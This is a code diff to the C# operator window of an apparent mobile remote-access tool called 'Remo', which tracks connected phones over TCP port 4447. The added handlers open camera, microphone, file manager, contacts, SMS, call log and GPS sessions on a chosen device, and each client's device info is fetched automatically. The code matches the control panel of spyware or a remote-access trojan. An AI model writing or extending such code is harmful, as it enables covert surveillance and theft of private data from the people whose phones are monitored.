@@ -7,6 +7,7 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
@@ -21,9 +22,10 @@ namespace Remo
         //UDPReceiver udpr;
         //mUDPHandler mUDPH;
         private Thread RefreshClientsListThread;
-        bool Stop = false;
+        volatile bool Stop = false;
         public static int Port = 4447;
         //private string SelectedClientIP = "";
+        MobInfo mi;
 
         public MainForm()
         {
@@ -33,9 +35,8 @@ namespace Remo
         private void Form1_Load(object sender, EventArgs e)
         {
             CheckForIllegalCrossThreadCalls = false;
+            
 
-            //IMClient fc = new Client();
-            //fc.initFeature(0);
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -81,6 +82,14 @@ namespace Remo
             mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.FM_LIST).Show();
         }
 
+        private void btnContacts_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CONTACTS).Show();
+        }
+        private void btnSMS_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.SMS).Show();
+        }
 
         private void RefreshClientsList()
         {
@@ -90,7 +99,9 @@ namespace Remo
             dgv1.Rows.Clear();
                 foreach (IMClient c in mTCPH.MainClientsDict.Values.ToList())
                 {
-                        dgv1.Rows.Add(c.getInfo());
+                if(!c.FeatureClients.ContainsKey((int)DataHandler.eDataType.INFO))
+                    mTCPH.addFClient((c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString(), (int)DataHandler.eDataType.INFO).Show();
+                dgv1.Rows.Add(((MobInfo)c.FeatureClients[(int)DataHandler.eDataType.INFO].F).getInfo());
                 }
             if (saveRow != -1 && saveRow < dgv1.Rows.Count)
                 dgv1.Rows[saveRow].Selected = true;
@@ -138,6 +149,41 @@ namespace Remo
             //    SelectedClientIP = dgv1.CurrentCell.OwningRow.Cells[0].Value.ToString();
             //}
             //catch { }
+        }
+
+        private void camToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CAM).Show();
+        }
+
+        private void micToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.MIC).Show();
+        }
+
+        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.FM_LIST).Show();
+        }
+
+        private void contactsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CONTACTS).Show();
+        }
+
+        private void sMSToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.SMS).Show();
+        }
+
+        private void callLogToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CALL_LOG).Show();
+        }
+
+        private void gPSToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.GPS).Show();
         }
     }
 }
